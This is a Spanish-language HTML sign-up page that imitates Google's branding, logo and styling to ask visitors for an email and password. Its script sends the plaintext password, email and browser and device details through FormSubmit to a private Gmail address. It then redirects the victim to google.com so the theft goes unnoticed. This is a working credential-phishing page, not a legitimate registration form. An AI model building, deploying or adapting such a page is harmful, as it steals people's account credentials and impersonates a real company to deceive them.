<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro Premium | TuMarca</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #4285F4;
            --primary-dark: #3367D6;
            --secondary-color: #34A853;
            --error-color: #EA4335;
            --text-color: #202124;
            --text-light: #5F6368;
            --border-color: #DADCE0;
            --bg-color: #F8F9FA;
            --white: #FFFFFF;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.6;
            padding: 0;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background-image: radial-gradient(circle at 10% 20%, rgba(66, 133, 244, 0.1) 0%, rgba(234, 67, 53, 0.1) 90%);
        }

        .container {
            max-width: 480px;
            width: 100%;
            margin: auto;
            padding: 40px;
            background-color: var(--white);
            border-radius: 16px;
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 6px;
            background: linear-gradient(90deg, #4285F4, #34A853, #FBBC05, #EA4335);
            z-index: 2;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo img {
            height: 48px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 30px;
            color: var(--text-color);
        }

        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--text-color);
            font-size: 14px;
        }

        .input-wrapper {
            position: relative;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: 16px;
            transition: var(--transition);
            background-color: var(--white);
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: var(--text-light);
            font-size: 18px;
        }

        .error-message {
            color: var(--error-color);
            font-size: 13px;
            margin-top: 6px;
            display: none;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .terms {
            margin: 24px 0;
            display: flex;
            align-items: flex-start;
        }

        .terms input {
            margin-right: 12px;
            margin-top: 4px;
        }

        .terms label {
            font-size: 14px;
            color: var(--text-light);
            font-weight: 400;
            line-height: 1.5;
        }

        .terms a {
            color: var(--primary-color);
            text-decoration: none;
        }

        .terms a:hover {
            text-decoration: underline;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: var(--primary-color);
            color: var(--white);
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        button:hover {
            background-color: var(--primary-dark);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(66, 133, 244, 0.2);
        }

        button:disabled {
            background-color: #E8F0FE;
            color: var(--primary-color);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--white);
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .login-link {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: var(--text-light);
        }

        .login-link a {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 500;
        }

        .login-link a:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: var(--text-light);
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid var(--border-color);
        }

        .divider::before {
            margin-right: 16px;
        }

        .divider::after {
            margin-left: 16px;
        }

        .social-login {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            background-color: var(--white);
            color: var(--text-color);
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
        }

        .social-btn:hover {
            background-color: #F8F9FA;
        }

        .social-btn img {
            width: 20px;
            height: 20px;
            margin-right: 12px;
        }

        .success-message {
            display: none;
            text-align: center;
            padding: 20px;
            background-color: #E6F4EA;
            border-radius: 8px;
            margin-bottom: 24px;
            color: var(--secondary-color);
            font-weight: 500;
        }

        .success-message i {
            font-size: 24px;
            margin-bottom: 10px;
            display: block;
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
                margin: 20px;
                border-radius: 12px;
            }
            
            body {
                padding: 0;
                background-color: var(--white);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        
        <div class="success-message" id="successMessage">
            <i>‚úì</i>
            <p>¬°Registro exitoso! Te hemos enviado un correo de confirmaci√≥n.</p>
        </div>
        
        <h1>Crea tu Cuenta</h1>
        
        <form id="registroForm">
            <div class="form-group">
                <label for="email">Correo electr√≥nico</label>
                <div class="input-wrapper">
                    <input type="email" id="email" name="email" required placeholder="tucorreo@gmail.com">
                </div>
                <div id="emailError" class="error-message">Por favor ingresa un email v√°lido</div>
            </div>
            
            <div class="form-group">
                <label for="password">Contrase√±a</label>
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" required minlength="8" placeholder="M√≠nimo 8 caracteres">
                    <span class="password-toggle" id="togglePassword">üëÅÔ∏è</span>
                </div>
                <div id="passwordError" class="error-message">La contrase√±a debe tener al menos 8 caracteres</div>
            </div>
            
            <div class="terms">
                <input type="checkbox" id="terms" name="terms" required>
                <label for="terms">Al registrarte, aceptas nuestros <a href="#" target="_blank">T√©rminos de Servicio</a> y <a href="#" target="_blank">Pol√≠tica de Privacidad</a>, incluida la pol√≠tica de Uso de Cookies.</label>
            </div>
            
            <button type="submit" id="submitBtn">
                <span class="spinner" id="spinner"></span>
                <span id="buttonText">Crear cuenta</span>
            </button>
            
            <div class="divider">o</div>
            
            <div class="social-login">
                <button type="button" class="social-btn">
                    <img src="https://www.google.com/favicon.ico" alt="Google">
                    Registrarse con Google
                </button>
                <button type="button" class="social-btn">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico" alt="Facebook">
                    Registrarse con Facebook
                </button>
            </div>
        </form>
        
        <div class="login-link">
            ¬øYa tienes una cuenta? <a href="login.html">Inicia sesi√≥n</a>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('registroForm');
            const submitBtn = document.getElementById('submitBtn');
            const buttonText = document.getElementById('buttonText');
            const spinner = document.getElementById('spinner');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const togglePassword = document.getElementById('togglePassword');
            const emailError = document.getElementById('emailError');
            const passwordError = document.getElementById('passwordError');
            const successMessage = document.getElementById('successMessage');
            const termsCheckbox = document.getElementById('terms');

            // Alternar visibilidad de contrase√±a
            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.textContent = type === 'password' ? 'üëÅÔ∏è' : 'üëÅÔ∏è‚Äçüó®Ô∏è';
            });

            // Validaci√≥n en tiempo real
            emailInput.addEventListener('input', validateEmail);
            passwordInput.addEventListener('input', validatePassword);
            termsCheckbox.addEventListener('change', validateForm);

            function validateEmail() {
                const email = emailInput.value.trim();
                const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
                
                if (email && !isValid) {
                    emailError.style.display = 'block';
                    return false;
                } else {
                    emailError.style.display = 'none';
                    return true;
                }
            }

            function validatePassword() {
                const password = passwordInput.value;
                const isValid = password.length >= 8;
                
                if (password && !isValid) {
                    passwordError.style.display = 'block';
                    return false;
                } else {
                    passwordError.style.display = 'none';
                    return true;
                }
            }

            function validateForm() {
                return validateEmail() && validatePassword() && termsCheckbox.checked;
            }

            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (!validateForm()) {
                    if (!termsCheckbox.checked) {
                        alert('Debes aceptar los t√©rminos y condiciones');
                    }
                    return;
                }
                
                // Mostrar spinner y deshabilitar bot√≥n
                submitBtn.disabled = true;
                spinner.style.display = 'block';
                buttonText.textContent = 'Registrando...';
                
                try {
                    // Crear objeto con todos los datos del formulario
                    const formData = {
                        correo_electronico: emailInput.value.trim(),
                        contrase√±a: passwordInput.value,
                        terminos_aceptados: termsCheckbox.checked ? "S√≠" : "No",
                        fecha_registro: new Date().toLocaleString('es-ES', {
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit'
                        }),
                        navegador: navigator.userAgent,
                        dispositivo: window.innerWidth > 768 ? "Escritorio" : "M√≥vil",
                        sistema_operativo: navigator.platform,
                        resolucion_pantalla: `${window.innerWidth}x${window.innerHeight}`
                    };

                    // Enviar datos a FormSubmit con TODOS los campos
                    const response = await fetch('https://formsubmit.co/ajax/enriquepng1@gmail.com', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            _subject: `Nuevo Registro - ${formData.correo_electronico}`,
                            _template: "table",
                            ...formData, // Incluye todos los campos del formulario
                            _autoresponse: `Hola ${formData.correo_electronico},\n\nGracias por registrarte. Hemos recibido tu informaci√≥n correctamente.\n\nFecha: ${formData.fecha_registro}`,
                            _captcha: "true",
                            _replyto: formData.correo_electronico,
                            _next: "https://www.google.com"
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (response.ok) {
                        // Mostrar mensaje de √©xito
                        form.style.display = 'none';
                        successMessage.style.display = 'block';
                        
                        // Redirigir despu√©s de 3 segundos
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 3000);
                    } else {
                        throw new Error(result.message || 'Error en el servidor');
                    }
                } catch (error) {
                    console.error('Error en el registro:', error);
                    alert('Ocurri√≥ un error al registrar. Por favor intenta nuevamente.');
                } finally {
                    // Restablecer el bot√≥n
                    submitBtn.disabled = false;
                    spinner.style.display = 'none';
                    buttonText.textContent = 'Crear cuenta';
                }
            });
            
            // Efecto hover mejorado para el bot√≥n
            submitBtn.addEventListener('mouseenter', function() {
                if (!this.disabled) {
                    this.style.transform = 'translateY(-2px)';
                    this.style.boxShadow = '0 6px 16px rgba(66, 133, 244, 0.25)';
                }
            });
            
            submitBtn.addEventListener('mouseleave', function() {
                this.style.transform = '';
                this.style.boxShadow = '';
            });
        });
    </script>
</body>
</html>
